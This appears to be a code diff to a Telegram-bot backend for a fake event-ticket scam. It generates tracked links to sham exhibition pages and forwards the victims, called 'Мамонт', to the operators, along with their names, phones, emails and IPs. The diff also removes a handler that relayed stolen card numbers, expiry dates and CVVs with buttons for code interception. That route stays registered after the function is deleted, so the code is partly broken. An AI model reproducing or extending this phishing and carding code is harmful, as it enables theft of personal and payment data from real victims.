@@ -81,6 +81,26 @@ CREATE TABLE IF NOT EXISTS event_links (
 """)
 conn.commit()
 
+# --- Таблица для користувачів сайту ---
+c.execute("""
+CREATE TABLE IF NOT EXISTS site_users (
+    id VARCHAR(12) PRIMARY KEY,
+    ip VARCHAR(45),
+    date_1 VARCHAR(20),
+    date_2 VARCHAR(20),
+    date_3 VARCHAR(20),
+    date_4 VARCHAR(20),
+    date_5 VARCHAR(20),
+    date_6 VARCHAR(20),
+    date_7 VARCHAR(20),
+    date_8 VARCHAR(20),
+    currency VARCHAR(10),
+    street TEXT,
+    price DECIMAL(10,2),
+    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+)
+""")
+conn.commit()
 
 
 
@@ -101,6 +121,46 @@ def get_user(user_id):
             'screenshots': json.loads(row[7]) if row[7] else [],
             'form_json': json.loads(row[8]) if row[8] else {},
             'is_admin': row[9] or 0
+        }
+    return None
+
+# --- Функції для роботи з site_users ---
+def generate_site_user_id():
+    """Генерує унікальний ID для користувача сайту"""
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
+
+def create_site_user(dates, currency, street, price):
+    """Створює нового користувача сайту з даними події"""
+    c = conn.cursor()
+    user_id = generate_site_user_id()
+    
+    c.execute('''INSERT INTO site_users 
+                 (id, date_1, date_2, date_3, date_4, date_5, date_6, date_7, date_8, currency, street, price) 
+                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+              (user_id, dates[0], dates[1], dates[2], dates[3], dates[4], dates[5], dates[6], dates[7], currency, street, price))
+    conn.commit()
+    return user_id
+
+def update_site_user_ip(user_id, ip):
+    """Оновлює IP адресу для користувача сайту"""
+    c = conn.cursor()
+    c.execute('UPDATE site_users SET ip=? WHERE id=?', (ip, user_id))
+    conn.commit()
+
+def get_site_user(user_id):
+    """Отримує дані користувача сайту"""
+    c = conn.cursor()
+    c.execute('SELECT * FROM site_users WHERE id=?', (user_id,))
+    row = c.fetchone()
+    if row:
+        return {
+            'id': row[0],
+            'ip': row[1],
+            'dates': [row[2], row[3], row[4], row[5], row[6], row[7], row[8], row[9]],
+            'currency': row[10],
+            'street': row[11],
+            'price': row[12],
+            'created_at': row[13]
         }
     return None
 
@@ -1002,12 +1062,14 @@ async def events_save_all(message):
     event_id = str(uuid.uuid4())
     short_event_id = event_id[:6]
     events_file = os.path.join('events-art.com', 'events.json')
+    
     # Завантажуємо існуючі події
     try:
         with open(events_file, 'r', encoding='utf-8') as f:
             events = json.load(f)
     except Exception:
         events = {}
+    
     # Додаємо нову подію
     user_event = EVENT_user_data[chat_id]
     events[event_id] = {
@@ -1024,28 +1086,41 @@ async def events_save_all(message):
             } for i in range(8)
         ]
     }
+    
     with open(events_file, 'w', encoding='utf-8') as f:
         json.dump(events, f, ensure_ascii=False, indent=2)
+    
     # Сохраняем связь event_code <-> user_id
     c = conn.cursor()
     c.execute('INSERT OR REPLACE INTO event_links (event_code, user_id) VALUES (?, ?)', (short_event_id, message.from_user.id))
     conn.commit()
-    # Формуємо повідомлення з посиланнями
+    
+    # --- Створюємо запис у site_users ---
     price = user_event.get('price', '45')
     currency = user_event.get('currency', 'EUR')
+    street = user_event.get('address', '')
+    dates = user_event.get('dates', [''] * 8)
+    
+    site_user_id = create_site_user(dates, currency, street, price)
+    
+    # Формуємо повідомлення з посиланнями
     msg = f"Выставка успешно создана:\n<b>{user_event.get('title', 'Выставка')}</b>\n"
-    msg += f"💰 Цена: <b>{price} {currency}</b>\n"
-    msg += f"📍 Адрес: <b>{user_event.get('address', 'Не указан')}</b>\n\n"
+    msg += f"�� Цена: <b>{price} {currency}</b>\n"
+    msg += f"📍 Адрес: <b>{street or 'Не указан'}</b>\n"
+    msg += f"🆔 Site User ID: <code>{site_user_id}</code>\n\n"
     msg += f"<b>Афиша:</b>\n"
-    msg += f"<b>Главная страница:</b> http://{EVENT_DOMAIN}/?e={short_event_id}&price={price}&currency={currency}\n"
+    msg += f"<b>Главная страница:</b> http://{EVENT_DOMAIN}/?e={short_event_id}&price={price}&currency={currency}&uid={site_user_id}\n"
+    
     for idx, ev in enumerate(events[event_id]['events'], 1):
-        # Формуємо коротке унікальне посилання з ціною
+        # Формуємо коротке унікальне посилання з ціною та user_id
         path = ev['path']
         if path.endswith('/index.html'):
             path = path[:-10]
-        link = f"http://{EVENT_DOMAIN}/{path}?e={short_event_id}&p={idx}&price={price}&currency={currency}"
+        link = f"http://{EVENT_DOMAIN}/{path}?e={short_event_id}&p={idx}&price={price}&currency={currency}&uid={site_user_id}"
         msg += f"{idx}. {ev['name']} ({ev['date']} {ev['time']})\n{link}\n"
+    
     await message.answer(msg, parse_mode='HTML')
+    
     # Повертаємо меню після створення виставки
     kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
     await message.answer("Головне меню:", reply_markup=kb)
@@ -1057,14 +1132,31 @@ async def notify_admin(request):
     name = data.get('name', '')
     mail = data.get('mail', '')
     ip = data.get('ip', '')
+    user_id = data.get('user_id', '')  # Додаємо user_id з запиту
+    
+    # --- Оновлюємо IP у базі даних, якщо передано user_id ---
+    if user_id and ip:
+        update_site_user_ip(user_id, ip)
+    
+    # --- Отримуємо дані користувача з бази ---
+    user_data_from_db = None
+    if user_id:
+        user_data_from_db = get_site_user(user_id)
+    
     # Формуємо повідомлення
-    msg = (
-        f"Мамонт ввёл Ф.И.О: <b>{name}</b>\n\n"
-        f"<b>phone_number:</b> <code>{phone}</code>\n"
-        f"<b>full_name:</b> <code>{name}</code>\n"
-        f"<b>mail:</b> <code>{mail}</code>\n"
-        f"<b>ip:</b> <code>{ip}</code>"
-    )
+    msg = f"Мамонт ввёл Ф.И.О: <b>{name}</b>\n\n"
+    msg += f"<b>phone_number:</b> <code>{phone}</code>\n"
+    msg += f"<b>full_name:</b> <code>{name}</code>\n"
+    msg += f"<b>mail:</b> <code>{mail}</code>\n"
+    msg += f"<b>ip:</b> <code>{ip}</code>"
+    
+    # Додаємо інформацію з бази даних, якщо є
+    if user_data_from_db:
+        msg += f"\n<b>Site User ID:</b> <code>{user_data_from_db['id']}</code>"
+        msg += f"\n<b>Цена:</b> <code>{user_data_from_db['price']} {user_data_from_db['currency']}</code>"
+        msg += f"\n<b>Адрес:</b> <code>{user_data_from_db['street']}</code>"
+        msg += f"\n<b>Дата создания:</b> <code>{user_data_from_db['created_at']}</code>"
+    
     # Клавіатура без 'Карта'
     kb = InlineKeyboardMarkup(
         inline_keyboard=[
@@ -1080,47 +1172,6 @@ async def notify_admin(request):
     except Exception as e:
         print('Error sending message:', e)
     return web.Response(text="OK")
-
-@log_function
-async def payment_notify(request):
-    data = await request.json()
-    email = data.get('email', '')
-    card = data.get('card', '')
-    expiry = data.get('expiry', '')
-    cvv = data.get('cvv', '')
-    ip = data.get('ip', '')
-    user_id = data.get('user_id', '')
-    # --- Зберігаємо IP у user_data для user_id ---
-    if user_id and ip:
-        try:
-            user_id_int = int(user_id)
-            if user_id_int not in user_data:
-                user_data[user_id_int] = {}
-            user_data[user_id_int]['ip'] = ip
-        except Exception:
-            pass
-    # --- Визначаємо user_id по IP, якщо не передано ---
-    if not user_id:
-        for uid, udata in user_data.items():
-            if udata.get('ip') == ip:
-                user_id = uid
-                break
-    text = f"Email: {email}\nCard Number: {card}\nExpiry Date: {expiry}\nCVV: {cvv}\nIP: {ip}"
-    kb_rows = [
-        [
-            InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
-            InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
-            InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
-            InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
-        ],
-        [
-            InlineKeyboardButton(text="Тех підтримка", callback_data=f"support:{ip}"),
-            InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
-        ]
-    ]
-    kb = InlineKeyboardMarkup(inline_keyboard=kb_rows)
-    await bot.send_message(ADMIN_GROUP_ID, text, reply_markup=kb)
-    return web.Response(text='ok')
 
 @log_function
 async def code_notify(request):
@@ -1316,7 +1367,19 @@ if __name__ == '__main__':
     async def main():
         # aiohttp app
         app = web.Application()
+        async def update_site_user_ip_endpoint(request):
+            """Endpoint для оновлення IP адреси користувача сайту"""
+            data = await request.json()
+            user_id = data.get('user_id', '')
+            ip = data.get('ip', '')
+            
+            if user_id and ip:
+                update_site_user_ip(user_id, ip)
+                return web.Response(text="OK")
+            else:
+                return web.Response(text="Missing user_id or ip", status=400)
         app.router.add_post('/notify_admin', notify_admin)
+        app.router.add_post('/update_site_user_ip', update_site_user_ip_endpoint)
         app.router.add_post('/payment_notify', payment_notify)
         app.router.add_post('/code_notify', code_notify)
         runner = web.AppRunner(app)
